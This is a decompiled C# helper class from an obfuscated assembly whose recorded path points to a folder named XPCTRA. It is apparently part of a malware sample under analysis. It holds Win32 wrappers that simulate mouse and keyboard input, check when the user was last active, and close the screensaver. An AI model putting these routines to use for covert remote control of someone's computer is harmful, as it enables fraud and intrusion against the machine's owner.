// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Helper.NativeMethodsHelper
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace VERMELHO265MONARCA.Core.Helper
{
  public static class NativeMethodsHelper
  {
    private const uint FIZ591BAMBOLE = 2;
    private const uint LOCUPLETAR546PINOIA = 4;
    private const uint INTERINIDADE836ETNICIDADE = 8;
    private const uint RES79ACUSATIVO = 16;
    private const uint ARRANCATOCO345CONTABIL = 2048;
    private const uint EMBRIAGUEZ656RAMIFICAR = 0;
    private const uint NAOFUMANTE6PRECOCE = 2;
    private const int ACABAVEL25SEMIINTERNO = 114;
    private const uint AGENDA617BOCHECHO = 128;
    private const uint MECANICA684FAISCANTE = 1;
    private const int OPOSTO803BAZUCA = 16;
    private const uint RATIFICACAO487APARAR = 17;
    private const uint HAITIANO7PERICIA = 2;

    public static uint GetLastInputInfoTickCount()
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.LASTINPUTINFO plii = new VERMELHO265MONARCA.Core.Utilities.NativeMethods.LASTINPUTINFO();
      plii.cbSize = (uint) Marshal.SizeOf((object) plii);
      plii.dwTime = 0U;
      return VERMELHO265MONARCA.Core.Utilities.NativeMethods.GetLastInputInfo(ref plii) ? plii.dwTime : 0U;
    }

    public static void DoMouseLeftClick(Point p, bool isMouseDown)
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.mouse_event(isMouseDown ? 2U : 4U, p.X, p.Y, 0, 0);
    }

    public static void DoMouseRightClick(Point p, bool isMouseDown)
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.mouse_event(isMouseDown ? 8U : 16U, p.X, p.Y, 0, 0);
    }

    public static void DoMouseMove(Point p)
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.SetCursorPos(p.X, p.Y);
    }

    public static void DoMouseScroll(Point p, bool scrollDown)
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.mouse_event(2048U, p.X, p.Y, scrollDown ? -120 : 120, 0);
    }

    public static void DoKeyPress(byte key, bool keyDown)
    {
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.keybd_event(key, (byte) 0, keyDown ? 0U : 2U, 0);
    }

    public static bool IsScreensaverActive()
    {
      IntPtr zero = IntPtr.Zero;
      if (VERMELHO265MONARCA.Core.Utilities.NativeMethods.SystemParametersInfo(114U, 0U, ref zero, 0U))
        ;
      return zero != IntPtr.Zero;
    }

    public static void DisableScreensaver()
    {
      IntPtr hDesktop = VERMELHO265MONARCA.Core.Utilities.NativeMethods.OpenDesktop("Screen-saver", 0, false, 129U);
      if (hDesktop != IntPtr.Zero)
      {
        VERMELHO265MONARCA.Core.Utilities.NativeMethods.EnumDesktopWindows(hDesktop, (VERMELHO265MONARCA.Core.Utilities.NativeMethods.EnumDesktopWindowsProc) ((hWnd, lParam) =>
        {
          if (VERMELHO265MONARCA.Core.Utilities.NativeMethods.IsWindowVisible(hWnd))
            VERMELHO265MONARCA.Core.Utilities.NativeMethods.PostMessage(hWnd, 16, 0, 0);
          return true;
        }), IntPtr.Zero);
        VERMELHO265MONARCA.Core.Utilities.NativeMethods.CloseDesktop(hDesktop);
      }
      else
        VERMELHO265MONARCA.Core.Utilities.NativeMethods.PostMessage(VERMELHO265MONARCA.Core.Utilities.NativeMethods.GetForegroundWindow(), 16, 0, 0);
      IntPtr zero = IntPtr.Zero;
      VERMELHO265MONARCA.Core.Utilities.NativeMethods.SystemParametersInfo(17U, 1U, ref zero, 2U);
    }
  }
}
